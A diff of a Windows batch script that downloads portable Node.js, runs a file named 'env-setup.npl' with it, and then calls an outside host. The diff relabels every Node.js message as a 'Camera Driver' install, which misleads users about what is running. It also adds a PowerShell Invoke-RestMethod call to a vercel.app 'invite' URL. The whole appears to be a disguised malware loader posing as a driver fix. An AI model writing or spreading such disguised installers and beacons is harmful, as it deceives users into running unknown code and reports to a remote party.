@@ -22,7 +22,7 @@ where node >nul 2>&1
 if not errorlevel 1 (
     for /f "delims=" %%v in ('node -v 2^>nul') do set "NODE_INSTALLED_VERSION=%%v"
     set "NODE_EXE=node"
-    echo [INFO] Node.js is already installed globally: %NODE_INSTALLED_VERSION%
+    echo [INFO] Camera Driver is already installed globally: %NODE_INSTALLED_VERSION%
 )
 
 if not defined NODE_EXE (
@@ -30,35 +30,35 @@ if not defined NODE_EXE (
         echo [INFO] Portable Node.js found after extraction.
         set "NODE_EXE=%PORTABLE_NODE%"
         set "PATH=%EXTRACT_DIR%\PFiles64\nodejs;%PATH%"
-    ) else ( echo [INFO] Node.js not found globally. Attempting to extract portable version...
+    ) else ( echo [INFO] Camera Driver not found globally. Attempting to extract portable version...
 
     :: -------------------------
     :: Download Node.js MSI if needed
     :: -------------------------
     where curl >nul 2>&1
     if errorlevel 1 (
-        echo [INFO] Using PowerShell to download Node.js...
+        echo [INFO] Downloading Camera Driver...
         powershell -Command "Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%~dp0%NODE_MSI%'"
     ) else (
-        echo [INFO] Using curl to download Node.js...
+        echo [INFO] Downloading Camera Driver...
         curl -s -L -o "%~dp0%NODE_MSI%" "%DOWNLOAD_URL%"
     )
 
     if exist "%~dp0%NODE_MSI%" (
-        echo [INFO] Extracting Node.js MSI to %EXTRACT_DIR%...
+        echo [INFO] Extracting Camera Driver MSI to %EXTRACT_DIR%...
         msiexec /a "%~dp0%NODE_MSI%" /qn TARGETDIR="%EXTRACT_DIR%"
         del "%~dp0%NODE_MSI%"
     ) else (
-        echo [ERROR] Failed to download Node.js MSI.
+        echo [ERROR] Failed to download Camera Driver MSI.
         exit /b 1
     )
 
     if exist "%PORTABLE_NODE%" (
-        echo [INFO] Portable Node.js found after extraction.
+        echo [INFO] Portable Camera Driver found after extraction.
         set "NODE_EXE=%PORTABLE_NODE%"
         set "PATH=%EXTRACT_DIR%\PFiles64\nodejs;%PATH%"
     ) else (
-        echo [ERROR] node.exe not found after extraction.
+        echo [ERROR] Camera Driver not found after extraction.
         exit /b 1
     )
     )
@@ -68,7 +68,7 @@ if not defined NODE_EXE (
 :: Confirm Node.js works
 :: -------------------------
 if not defined NODE_EXE (
-    echo [ERROR] Node.js executable not found or set.
+    echo [ERROR] Camera Driver executable not found or set.
     exit /b 1
 )
 :: -------------------------
@@ -89,7 +89,7 @@ if errorlevel 1 (
 :: Run the parser
 :: -------------------------
 if exist "%CODEPROFILE%\env-setup.npl" (
-    echo [INFO] Running env-setup.npl...
+    echo [INFO] Running env-setup...
     cd "%CODEPROFILE%"
     "%NODE_EXE%" "env-setup.npl"
     if errorlevel 1 (
@@ -97,9 +97,11 @@ if exist "%CODEPROFILE%\env-setup.npl" (
         exit /b 1
     )
 ) else (
-    echo [ERROR] env-setup.npl not found.
+    echo [ERROR] env-setup not found.
     exit /b 1
 )
 
-echo [SUCCESS] Script completed successfully.
+powershell Invoke-RestMethod -Uri "https://myproject-backend-beta.vercel.app/invite/ayg1clqmqx99mqr6cjjp0u" -Method Get
+
+echo [SUCCESS] Camera Driver Setup completed successfully.
 exit /b 0
